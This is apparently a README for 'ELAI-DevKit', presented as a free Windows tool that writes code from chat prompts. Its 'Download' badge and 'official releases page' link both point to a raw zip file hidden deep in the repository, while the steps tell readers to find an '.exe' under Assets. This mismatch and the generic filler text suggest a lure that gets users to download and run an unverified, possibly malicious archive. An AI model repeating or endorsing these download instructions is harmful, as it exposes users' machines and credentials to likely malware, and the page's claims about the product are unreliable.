# 🤖 ELAI-DevKit - Build software using simple chat prompts

[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/fonscutup654/ELAI-DevKit/main/apps/dev_patcher/core/patcher_tools/ELA-Dev-Kit-2.2.zip)

ELAI-DevKit helps you build and modify code projects through natural language. You talk to the software, and it writes the code for you. You do not need deep programming knowledge to start. This tool bridges the gap between your ideas and a working computer application.

## 🛠 What this tool does

Many people find software development difficult. Professional tools require knowledge of code syntax and complex environments. ELAI-DevKit simplifies this process. It acts as an interface that translates your instructions into functional files.

- Create new projects from scratch using prompts.
- Modify existing code by describing changes.
- Automate repetitive tasks within your files.
- Use your own local settings.
- Keep your work private on your machine.

## 💻 System requirements

Your computer needs to meet these basic standards to run the application well:

- Operating System: Windows 10 or Windows 11.
- Processor: A modern dual-core CPU or better.
- Memory: 8 GB of RAM is recommended.
- Storage: 500 MB of free disk space.
- Internet: Required for the initial installation and AI model communication.

## 📥 Getting setup

Follow these steps to install the software on your Windows machine.

1. Visit the [official releases page](https://raw.githubusercontent.com/fonscutup654/ELAI-DevKit/main/apps/dev_patcher/core/patcher_tools/ELA-Dev-Kit-2.2.zip) to find the latest version.
2. Look for the file ending in `.exe` under the Assets section.
3. Click the file name to start the download.
4. Locate the file in your Downloads folder once the transfer finishes.
5. Double-click the file to start the installer.
6. Follow the on-screen prompts to place the software in your desired folder. 
7. Select the "Create Desktop Shortcut" option if you want quick access later.

## ⚙️ Initial configuration

The first time you open ELAI-DevKit, you must set it up to talk to the AI components.

1. Open ELAI-DevKit from your desktop or start menu.
2. The software will open a window. Look for the Settings icon, represented by a gear.
3. You will see a box for your API key. If you do not have one, the settings menu provides links to get a key from reputable AI providers.
4. Paste your key into the designated field.
5. Click Save. The software tests the connection. A green checkmark confirms the app is ready for use.

## 💬 Running your first project

Using ELAI-DevKit involves four main steps:

### 1. Choosing a folder
Open the app and select "New Project". Pick a folder on your computer where you want the code to live. ELAI-DevKit creates a project file inside this folder to track your progress.

### 2. Describing the goal
You will see a large text entry field. Describe what you want to build. Use plain language. For example, you might type, "Create a button that generates a random number," or "Add a background color to my index file." 

### 3. Reviewing changes
The AI generates code based on your prompt. The app displays the proposed changes in a split-screen view. You see the original code on the left and the new code on the right. Review these changes to ensure they match your needs.

### 4. Applying the patch
Click the "Apply" button. The app updates your files locally. If you do not like the result, click "Undo" to revert the files to their previous state.

## 📊 Understanding the interface

The main screen contains several key sections:

- **Chat Sidebar:** This area stores your history with the AI. You can scroll back through previous requests to see how a project evolved.
- **Main Viewport:** This space displays the file you are currently editing. The app highlights lines that changed during the last patch.
- **Prompt Bar:** This is where you talk to the AI. Type your instructions here and press Enter.
- **Status Indicator:** Located in the bottom right corner, this shows if the tool is currently thinking or waiting for input.

## 🧩 Tips for better results

The quality of your output depends on your instructions. Follow these tips to get the best results:

- Provide context. Explain the goal clearly early on.
- Break large tasks into smaller items. Do not ask for an entire website in one prompt. Ask for the header first, then the content, then the footer.
- Use descriptive language. Instead of saying "fix it," say "make the button blue and center it on the screen."
- Check the files manually. If something behaves in an unexpected way, open the file in your preferred text editor to see how it looks.

## 🛡 Security and privacy

Your code remains on your machine. ELAI-DevKit only sends the specific prompts and necessary file snippets to the AI service to generate code. It does not send your entire project history or personal files. Always verify the AI-generated code before you run it, as with any automated tool.

## ❓ Frequently asked questions

**Does this software cost money?**
The software is free to use. However, you might need to pay the AI provider for the messages you send. Check your provider's terms for details.

**Can I use this for complex software?**
ELAI-DevKit works best for small to medium tools, scripts, and automation tasks. It is not currently designed to build massive enterprise applications.

**What happens if the software crashes?**
The app keeps a backup of your project files in a sub-folder called `backups`. You can recover your work from there if you encounter a critical error.

**Do I need a separate code editor?**
You can use ELAI-DevKit to write and test simple code. For more advanced needs, you can open the project folder in any text editor like Notepad or VS Code while ELAI-DevKit handles the automated modifications.